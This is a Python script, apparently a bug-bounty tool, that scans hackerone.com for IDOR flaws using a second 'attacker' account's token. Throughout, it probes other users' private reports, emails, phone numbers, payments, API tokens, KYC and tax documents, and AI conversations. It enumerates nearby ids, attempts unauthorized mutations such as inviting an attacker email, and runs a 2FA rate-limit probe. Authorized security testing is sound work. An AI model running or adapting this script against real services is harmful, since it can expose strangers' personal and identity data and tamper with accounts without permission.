#!/usr/bin/env python3
"""
HackerOne Cross-User IDOR Scanner
Systematically tests every GraphQL query/mutation with Account B's token
against Account A's resource IDs. Flags any response where B gets A's data.

Usage:
  python3 h1_idor_scanner.py --token-a TOKEN_A --token-b TOKEN_B --report-id REPORT_ID
  python3 h1_idor_scanner.py --token-a TOKEN_A --token-b TOKEN_B --report-id REPORT_ID --user-id USER_ID --program HANDLE
"""

import argparse
import base64
import json
import time
import sys
from typing import Optional
import urllib.request
import urllib.error

# ─── Config ───────────────────────────────────────────────────────────────────
GRAPHQL_URL = "https://hackerone.com/graphql"
REST_BASE    = "https://hackerone.com"
API_BASE     = "https://api.hackerone.com"
SLEEP        = 0.4   # between requests — avoid Cloudflare 1015
FINDINGS     = []    # collected findings

# ─── HTTP Helpers ─────────────────────────────────────────────────────────────

def gql(token: str, query: str, variables: dict = None) -> dict:
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        GRAPHQL_URL,
        data=data,
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
            "X-Auth-Token": token,
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return {"_http_error": e.code, "_body": e.read().decode(errors="replace")}
    except Exception as e:
        return {"_error": str(e)}


def rest(token: str, path: str) -> tuple[int, dict | str]:
    req = urllib.request.Request(
        f"{REST_BASE}{path}",
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0",
            "X-Auth-Token": token,
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, str(e)


def make_gid(typename: str, id_: int | str) -> str:
    return base64.b64encode(f"gid://hackerone/{typename}/{id_}".encode()).decode()


# ─── Comparison Logic ─────────────────────────────────────────────────────────

def is_same_data(resp_a: dict, resp_b: dict) -> bool:
    """Returns True if B got real data (not null/error) AND it matches A's data."""
    def extract_data(r):
        if "data" in r:
            d = r["data"]
            if d is None:
                return None
            # flatten one level
            for v in d.values():
                if v is not None and v != {} and v != []:
                    return v
        return None

    data_a = extract_data(resp_a)
    data_b = extract_data(resp_b)
    if data_a is None or data_b is None:
        return False
    # B got something non-null — check if it looks like real data
    return data_b == data_a


def flag(test_name: str, token_b_response: dict, severity: str = "HIGH"):
    print(f"\n{'='*60}")
    print(f"  [IDOR FOUND] {test_name}")
    print(f"  Severity: {severity}")
    print(f"  Account B Response: {json.dumps(token_b_response, indent=2)[:400]}")
    print(f"{'='*60}")
    FINDINGS.append({"test": test_name, "severity": severity, "response": token_b_response})


def check(test_name: str, resp_a: dict, resp_b: dict, severity: str = "HIGH"):
    """Compare A's response to B's. Flag if B got real data."""
    same = is_same_data(resp_a, resp_b)
    b_data = resp_b.get("data", {})
    has_error = bool(resp_b.get("errors")) or "_http_error" in resp_b

    # B got non-null data and no errors = IDOR
    if b_data and not has_error:
        for v in b_data.values():
            if v is not None:
                flag(test_name, resp_b, severity)
                return
    status = "BLOCKED" if has_error else "NULL (ok)"
    print(f"  [{status}] {test_name}")


# ─── Test Suites ─────────────────────────────────────────────────────────────

def test_report_idor(token_a: str, token_b: str, report_id: str):
    print("\n[1] REPORT IDOR — Cross-user report access")
    sleep()

    queries = [
        ("report.title", "{ report(id: \"%s\") { title } }" % report_id),
        ("report.body", "{ report(id: \"%s\") { vulnerability_information } }" % report_id),
        ("report.bounty", "{ report(id: \"%s\") { bounty_amount } }" % report_id),
        ("report.severity", "{ report(id: \"%s\") { severity_rating } }" % report_id),
        ("report.reporter", "{ report(id: \"%s\") { reporter { username email } } }" % report_id),
        ("report.activities", "{ report(id: \"%s\") { activities { nodes { message type } } } }" % report_id),
        ("report.attachments", "{ report(id: \"%s\") { attachments { nodes { file_name expiring_url } } } }" % report_id),
        ("report.weakness", "{ report(id: \"%s\") { weakness { name } } }" % report_id),
        ("report.full", """{ report(id: \"%s\") {
          title vulnerability_information bounty_amount severity_rating
          state substate disclosed_at
          reporter { username email }
          team { handle }
        } }""" % report_id),
    ]

    for name, query in queries:
        r_a = gql(token_a, query)
        sleep()
        r_b = gql(token_b, query)
        sleep()
        check(name, r_a, r_b)


def test_report_node_idor(token_a: str, token_b: str, report_id: str):
    print("\n[2] REPORT NODE GID IDOR")
    gid = make_gid("Report", report_id)

    q = '{ node(id: "%s") { ... on Report { title vulnerability_information bounty_amount reporter { username } } } }' % gid
    r_a = gql(token_a, q)
    sleep()
    r_b = gql(token_b, q)
    sleep()
    check("node(Report GID)", r_a, r_b)


def test_rest_report_idor(token_a: str, token_b: str, report_id: str):
    print("\n[3] REST REPORT IDOR — /reports/:id.json")

    status_a, data_a = rest(token_a, f"/reports/{report_id}.json")
    sleep()
    status_b, data_b = rest(token_b, f"/reports/{report_id}.json")
    sleep()

    print(f"  Account A status: {status_a}")
    print(f"  Account B status: {status_b}")

    if status_b == 200 and isinstance(data_b, dict):
        # B got a response — check fields
        sensitive = ["title", "vulnerability_information", "bounty_amount", "reporter"]
        for field in sensitive:
            if field in data_b and data_b[field]:
                flag(f"REST /reports/{report_id}.json — field: {field}", data_b)
                return
        print(f"  [NULL/OK] REST report — B got 200 but no sensitive fields")
    else:
        print(f"  [BLOCKED] REST report — B got {status_b}")


def test_duplicate_detector_idor(token_a: str, token_b: str, program_handle: str):
    print("\n[4] DuplicateDetectorReportsIndex — Cross-program report search")

    # Test if authenticated B can access reports from programs they're not in
    q = '''{ search(index: DuplicateDetectorReportsIndex, query_string: "team_handle:%s") {
      nodes { ... on Report { id title vulnerability_information team { handle } state } }
      total_count
    } }''' % program_handle

    r_a = gql(token_a, q)
    sleep()
    r_b = gql(token_b, q)
    sleep()

    a_total = r_a.get("data", {}).get("search", {}).get("total_count", 0)
    b_total = r_b.get("data", {}).get("search", {}).get("total_count", 0)

    print(f"  Account A sees: {a_total} reports")
    print(f"  Account B sees: {b_total} reports")

    if b_total and b_total > 0:
        b_nodes = r_b.get("data", {}).get("search", {}).get("nodes", [])
        if b_nodes:
            flag("DuplicateDetectorReportsIndex cross-program access", r_b, "CRITICAL")
    else:
        print(f"  [BLOCKED] DuplicateDetectorReportsIndex — B sees 0 or error")


def test_program_idor(token_a: str, token_b: str, program_handle: str):
    print("\n[5] PRIVATE PROGRAM IDOR — Program data access")

    queries = [
        ("program.policy", '{ team(handle: "%s") { policy } }' % program_handle),
        ("program.members", '{ team(handle: "%s") { members { nodes { user { username } role } } } }' % program_handle),
        ("program.scopes", '{ team(handle: "%s") { structured_scopes { nodes { asset_identifier asset_type } } } }' % program_handle),
        ("program.bounty_table", '{ team(handle: "%s") { bounty_table { ranges { ... on BountyRange { minimum_severity maximum_severity smart_rewards } } } } }' % program_handle),
        ("program.credentials", '{ team(handle: "%s") { credentials { nodes { id } } } }' % program_handle),
        ("program.invitations", '{ team(handle: "%s") { pending_invitations { nodes { email } } } }' % program_handle),
    ]

    for name, query in queries:
        r_a = gql(token_a, query)
        sleep()
        r_b = gql(token_b, query)
        sleep()
        check(name, r_a, r_b, severity="MEDIUM")


def test_user_idor(token_a: str, token_b: str, user_id: str):
    print("\n[6] USER DATA IDOR — Private researcher data")

    queries = [
        ("user.email", '{ user(id: "%s") { email } }' % user_id),
        ("user.earnings", '{ user(id: "%s") { bounty_earned_in_cents } }' % user_id),
        ("user.phone", '{ user(id: "%s") { phone_number } }' % user_id),
        ("user.private_reports", '{ user(id: "%s") { reports { nodes { id title } } } }' % user_id),
        ("user.payments", '{ user(id: "%s") { payments { nodes { amount_in_usd_cents } } } }' % user_id),
        ("user.api_tokens", '{ user(id: "%s") { api_tokens { nodes { id label } } } }' % user_id),
    ]

    for name, query in queries:
        r_a = gql(token_a, query)
        sleep()
        r_b = gql(token_b, query)
        sleep()
        check(name, r_a, r_b, severity="HIGH")

    # REST endpoints
    print("  [REST] Checking user data endpoints...")
    for path in [f"/api/v1/users/{user_id}/payments", f"/api/v1/users/{user_id}/earnings"]:
        s_a, _ = rest(token_a, path)
        sleep()
        s_b, d_b = rest(token_b, path)
        sleep()
        if s_b == 200 and isinstance(d_b, dict) and d_b:
            flag(f"REST {path}", d_b, "HIGH")
        else:
            print(f"  [BLOCKED] REST {path} — B got {s_b}")


def test_identity_idor(token_a: str, token_b: str, user_id: str):
    print("\n[7] IDENTITY / LEGAL DOCUMENT IDOR")

    # GraphQL
    q = '{ user(id: "%s") { identity_verification { status } } }' % user_id
    r_a = gql(token_a, q)
    sleep()
    r_b = gql(token_b, q)
    sleep()
    check("user.identity_verification", r_a, r_b, "CRITICAL")

    # node() for UserIdentity type
    gid = make_gid("UserIdentity", user_id)
    q2 = '{ node(id: "%s") { ... on UserIdentity { identity_verified citizenship_verified cleared } } }' % gid
    r_a2 = gql(token_a, q2)
    sleep()
    r_b2 = gql(token_b, q2)
    sleep()
    check("node(UserIdentity)", r_a2, r_b2, "HIGH")

    # REST endpoints that might expose documents
    for path in [
        f"/api/v1/users/{user_id}/identity",
        f"/api/v1/users/{user_id}/identity_documents",
        f"/api/v1/users/{user_id}/kyc",
        f"/api/v1/users/{user_id}/tax_forms",
    ]:
        s_b, d_b = rest(token_b, path)
        sleep()
        if s_b == 200 and d_b:
            flag(f"REST {path}", {"status": s_b, "data": d_b}, "CRITICAL")
        else:
            print(f"  [BLOCKED] {path} — B got {s_b}")


def test_collaboration_idor(token_a: str, token_b: str, report_id: str):
    print("\n[8] REPORT COLLABORATION / DRAFT IDOR")

    # Draft reports
    for draft_offset in range(0, 5):
        draft_id = str(int(report_id) - draft_offset)
        gid = make_gid("ReportDraft", draft_id)
        q = '{ node(id: "%s") { ... on ReportDraft { title body } } }' % gid
        r_b = gql(token_b, q)
        sleep()
        data = r_b.get("data", {}).get("node")
        if data and data.get("title"):
            flag(f"ReportDraft IDOR (id={draft_id})", r_b, "HIGH")
            break

    # ReportIntent (submitted but unprocessed)
    gid_intent = make_gid("ReportIntent", report_id)
    q2 = '{ node(id: "%s") { ... on ReportIntent { vulnerability_information } } }' % gid_intent
    r_b2 = gql(token_b, q2)
    sleep()
    if r_b2.get("data", {}).get("node"):
        flag("ReportIntent IDOR", r_b2, "HIGH")
    else:
        print("  [BLOCKED] ReportDraft/ReportIntent — B gets null/error")

    # ReportCollaborator
    q3 = '{ report(id: "%s") { collaborators { nodes { user { username } } } } }' % report_id
    r_a3 = gql(token_a, q3)
    sleep()
    r_b3 = gql(token_b, q3)
    sleep()
    check("report.collaborators", r_a3, r_b3, "MEDIUM")


def test_hai_idor(token_a: str, token_b: str, report_id: str):
    print("\n[9] HAI AI — Cross-tenant data leakage")

    # LlmConversation access
    for conv_id in range(1, 6):
        gid = make_gid("LlmConversation", conv_id)
        q = '{ node(id: "%s") { ... on LlmConversation { messages { nodes { content role } } } } }' % gid
        r_b = gql(token_b, q)
        sleep()
        node = r_b.get("data", {}).get("node")
        if node and node.get("messages"):
            flag(f"LlmConversation IDOR (id={conv_id})", r_b, "CRITICAL")
            break

    # hai_task
    q2 = '{ hai_task(id: "%s") { status result } }' % report_id
    r_b2 = gql(token_b, q2)
    sleep()
    if r_b2.get("data", {}).get("hai_task"):
        flag("hai_task IDOR", r_b2, "HIGH")
    else:
        print("  [NULL] hai_task — returns null (expected)")

    # ExploitAgentConversation
    gid3 = make_gid("ExploitAgentConversation", report_id)
    q3 = '{ node(id: "%s") { ... on ExploitAgentConversation { messages { nodes { content } } } } }' % gid3
    r_b3 = gql(token_b, q3)
    sleep()
    if r_b3.get("data", {}).get("node"):
        flag("ExploitAgentConversation IDOR", r_b3, "CRITICAL")
    else:
        print("  [NULL] ExploitAgentConversation — blocked")


def test_manager_mutations(token_a: str, token_b: str, report_id: str, program_handle: str):
    print("\n[10] PROGRAM MANAGER MUTATIONS — privilege escalation")

    # Try updating report state as Account B
    mutations = [
        ("updateReportState.triaged",
         'mutation { updateReportState(input: { id: "%s", message: "test", state: triaged }) { report { state } } }' % report_id),
        ("updateReportState.resolved",
         'mutation { updateReportState(input: { id: "%s", message: "test", state: resolved }) { report { state } } }' % report_id),
        ("addComment",
         'mutation { createActivity(input: { report_id: "%s", message: "test comment from B" }) { activity { message } } }' % report_id),
        ("inviteMember",
         'mutation { createTeamMemberInvitation(input: { team_handle: "%s", email: "attacker_test@mailnull.com", role: member }) { team_member_invitation { email } } }' % program_handle),
    ]

    for name, query in mutations:
        r_b = gql(token_b, query)
        sleep()
        data = r_b.get("data", {})
        errors = r_b.get("errors", [])

        # Check if mutation succeeded (data returned, no auth errors)
        success = any(v is not None for v in data.values()) if data else False
        auth_error = any("permission" in str(e).lower() or "unauthorized" in str(e).lower()
                         or "not allowed" in str(e).lower() for e in errors)

        if success and not auth_error:
            flag(f"Mutation authorized for Account B: {name}", r_b, "CRITICAL")
        else:
            err_msg = errors[0].get("message", "unknown") if errors else "none"
            print(f"  [BLOCKED] {name} — error: {err_msg[:80]}")


def test_graphql_csrf(token_a: str):
    print("\n[11] GraphQL CSRF + CORS check")

    # Check CORS on /graphql
    req = urllib.request.Request(
        GRAPHQL_URL,
        data=b'{"query":"{ me { id } }"}',
        headers={
            "Origin": "https://attacker.com",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token_a}",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            acao = r.headers.get("Access-Control-Allow-Origin", "not set")
            acac = r.headers.get("Access-Control-Allow-Credentials", "not set")
            print(f"  Access-Control-Allow-Origin: {acao}")
            print(f"  Access-Control-Allow-Credentials: {acac}")
            if acao == "*" or acao == "https://attacker.com":
                flag("CORS wildcard/reflection on /graphql", {"acao": acao, "acac": acac}, "HIGH")
            else:
                print(f"  [BLOCKED] CORS properly restricted")
    except Exception as e:
        print(f"  [ERROR] {e}")


def test_2fa_rate_limit(token_b: str):
    print("\n[12] 2FA Rate Limit Check (15 rapid wrong codes)")
    print("  NOTE: This only tests rate limiting, not credential validity")
    print("  Run this ONLY against your own Account B with 2FA enabled")

    # We just simulate the endpoint — actual brute force needs real wrong codes
    # This checks if the endpoint rate-limits at all
    endpoint = f"{REST_BASE}/users/two_factor_authentication"
    blocked_at = None

    for i in range(15):
        code = f"{i:06d}"
        data = json.dumps({"user": {"otp_attempt": code}}).encode()
        req = urllib.request.Request(
            endpoint,
            data=data,
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {token_b}",
                "User-Agent": "Mozilla/5.0",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                status = r.status
        except urllib.error.HTTPError as e:
            status = e.code
        except:
            status = 0

        print(f"  Attempt {i+1}/15 (code={code}): HTTP {status}")
        if status == 429:
            blocked_at = i + 1
            print(f"  [RATE LIMITED] Blocked at attempt {i+1}")
            break
        time.sleep(0.2)

    if not blocked_at:
        print(f"  [POTENTIAL] No rate limit detected after 15 attempts")
        print(f"  Severity: MEDIUM — 2FA brute force may be possible")
        FINDINGS.append({"test": "2FA rate limit missing", "severity": "MEDIUM"})


def test_s3_url(attachment_url: str, token_b: str):
    """Test if a signed S3 URL is accessible without H1 auth (or with wrong user)."""
    print("\n[13] S3 SIGNED URL TEST")
    if not attachment_url:
        print("  Skipped — no attachment URL provided (use --attachment-url)")
        return

    # Test 1: access without any H1 auth (pure S3 presigned URL)
    req = urllib.request.Request(attachment_url, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            print(f"  Unauthenticated access: HTTP {r.status} — URL works without H1 session")
            print(f"  Content-Type: {r.headers.get('Content-Type')}")
            if r.status == 200:
                print(f"  [INFO] S3 URL is publicly accessible — check if file is from PRIVATE report")
    except urllib.error.HTTPError as e:
        print(f"  Unauthenticated access: HTTP {e.code} — BLOCKED")

    # Test 2: access with Account B's H1 token
    req2 = urllib.request.Request(
        attachment_url,
        headers={"Authorization": f"Bearer {token_b}", "User-Agent": "Mozilla/5.0"},
    )
    try:
        with urllib.request.urlopen(req2, timeout=10) as r:
            print(f"  Account B access: HTTP {r.status}")
    except urllib.error.HTTPError as e:
        print(f"  Account B access: HTTP {e.code}")


# ─── Orchestrator ─────────────────────────────────────────────────────────────

def sleep():
    time.sleep(SLEEP)


def print_summary():
    print("\n" + "="*60)
    print(f"  SCAN COMPLETE — {len(FINDINGS)} finding(s)")
    print("="*60)
    if not FINDINGS:
        print("  No IDOR findings. All access controls held.")
        print("  Next steps:")
        print("    1. Test Hai AI manually (interactive)")
        print("    2. Test OAuth flow in browser with Burp")
        print("    3. Test race conditions with Turbo Intruder")
        print("    4. Test PullRequest.com manually")
    for i, f in enumerate(FINDINGS, 1):
        print(f"\n  [{i}] {f['test']} — {f['severity']}")


def main():
    parser = argparse.ArgumentParser(description="HackerOne Cross-User IDOR Scanner")
    parser.add_argument("--token-a", required=True, help="Account A Bearer token (resource owner)")
    parser.add_argument("--token-b", required=True, help="Account B Bearer token (attacker)")
    parser.add_argument("--report-id", help="A report ID that Account A owns")
    parser.add_argument("--user-id", help="Account A's numeric user ID")
    parser.add_argument("--program", help="Program handle to test (A's sandbox program)")
    parser.add_argument("--attachment-url", help="Signed S3 URL from a private report attachment")
    parser.add_argument("--skip", nargs="*", default=[], help="Test numbers to skip e.g. --skip 3 7 12")
    parser.add_argument("--only", nargs="*", default=[], help="Run only specific tests e.g. --only 1 2 9")
    args = parser.parse_args()

    skip = set(args.skip or [])
    only = set(args.only or [])

    def should_run(n: str) -> bool:
        if only:
            return n in only
        return n not in skip

    print("HackerOne IDOR Scanner")
    print(f"Token A: {args.token_a[:8]}...")
    print(f"Token B: {args.token_b[:8]}...")
    print(f"Report ID: {args.report_id}")
    print(f"User ID: {args.user_id}")
    print(f"Program: {args.program}")
    print(f"Sleep between requests: {SLEEP}s\n")

    if not args.report_id and not args.user_id and not args.program:
        print("ERROR: Provide at least one of --report-id, --user-id, or --program")
        sys.exit(1)

    if args.report_id:
        if should_run("1"): test_report_idor(args.token_a, args.token_b, args.report_id)
        if should_run("2"): test_report_node_idor(args.token_a, args.token_b, args.report_id)
        if should_run("3"): test_rest_report_idor(args.token_a, args.token_b, args.report_id)
        if should_run("8"): test_collaboration_idor(args.token_a, args.token_b, args.report_id)
        if should_run("9"): test_hai_idor(args.token_a, args.token_b, args.report_id)
        if args.program and should_run("10"):
            test_manager_mutations(args.token_a, args.token_b, args.report_id, args.program)

    if args.program:
        if should_run("4"): test_duplicate_detector_idor(args.token_a, args.token_b, args.program)
        if should_run("5"): test_program_idor(args.token_a, args.token_b, args.program)

    if args.user_id:
        if should_run("6"): test_user_idor(args.token_a, args.token_b, args.user_id)
        if should_run("7"): test_identity_idor(args.token_a, args.token_b, args.user_id)

    if should_run("11"): test_graphql_csrf(args.token_a)
    if should_run("12"): test_2fa_rate_limit(args.token_b)
    if args.attachment_url and should_run("13"):
        test_s3_url(args.attachment_url, args.token_b)

    print_summary()


if __name__ == "__main__":
    main()
